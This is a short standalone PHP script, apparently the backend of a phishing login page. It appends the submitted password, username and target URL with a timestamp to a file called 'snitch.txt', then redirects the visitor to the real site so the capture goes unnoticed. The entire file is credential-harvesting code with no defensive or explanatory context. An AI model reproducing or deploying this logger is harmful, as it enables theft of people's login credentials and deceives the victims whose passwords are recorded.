<?php
header("Location: $url");
$handle = fopen("snitch.txt", "a");
fwrite($handle, date("Y-m-d H:i:s")."> $pass:$user@$url\n");
fclose($handle);
die();
?>